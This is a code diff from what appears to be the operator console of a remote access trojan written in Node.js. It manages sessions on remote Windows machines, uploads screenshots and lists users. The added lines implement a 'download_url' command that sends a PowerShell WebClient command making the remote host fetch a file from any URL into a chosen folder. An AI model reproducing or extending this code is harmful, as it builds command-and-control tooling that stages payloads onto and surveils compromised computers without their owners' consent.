@@ -123,6 +123,13 @@ process.stdin.on("keypress", function (ch, key) {
 		commandLength = cmdHistory[cmdHistory.length - pos].length;
 		if (cmdHistory[cmdHistory.length - 1] == "screenshot") {
 			console.log("[".white + "+".blue + "]".white + "Uploading screenshot (May exceed 10MO, please be patient)...".bold);
+		}else if (cmdHistory[cmdHistory.length - 1].startsWith("download_url")) {
+			var string = cmdHistory[cmdHistory.length - 1].split(" ");
+			var url = string[1];
+			var filename = string[2];
+			var path = string[3];
+			console.log("[".white + "+".blue + "]".white + "Download request sent ! Please wait while downloading...".bold);
+			sessions[currentSession].send('cd ' + path + ' & powershell -c \"(New-Object Net.WebClient).DownloadFile(\'' + url + '\', \'' + filename + '\')\"');
 		}else if(cmdHistory[cmdHistory.length - 1] == "list_users"){
 			sessions[currentSession].send("cd /Users & dir");
 		}else{
